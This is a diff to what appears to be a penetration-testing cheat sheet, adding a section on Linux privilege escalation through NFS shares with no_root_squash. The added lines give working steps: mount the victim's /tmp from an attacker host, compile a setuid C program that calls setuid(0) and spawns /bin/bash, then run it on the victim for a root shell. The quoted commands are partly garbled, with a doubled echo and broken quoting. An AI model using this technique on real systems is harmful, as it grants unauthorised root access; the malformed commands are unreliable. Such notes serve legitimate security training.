@@ -222,8 +222,34 @@ Next, we can `/tmp/bash -p` and we will have root.
  
  ## [NFS ROOT SQUASHING]
  
- >WIP
+*Look for mountable drives that could be used to privesc*
+
+> **Victim machine**
+
+Hunt for folders
+
+    cat /etc/export
+
+We will take the example of a `/tmp` directory with the "no_root_squash* attribute present.
+
+> **Host machine**
  
+1. Create a directory where you will mount the `/tmp` directory.
+ 
+    `mount -o rw,vers=2 <IP>:/tmp <PATH TO NEWLY CREATED DIRECTORY>`
+    
+2. Create a malicious payload inside the mounted directory
+
+```
+echo 'echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > <PATH TO MOUNTED DIRECTORY>/x.c    
+gcc <PATH TO FILE>/x.c -o <PATH TO FILE>/x
+chmod +s <PATH TO FILE>/x
+ ```
+ 
+> **Victim machine**
+
+Execute the created file.
+
  ## [DOCKER]
  
  >WIP
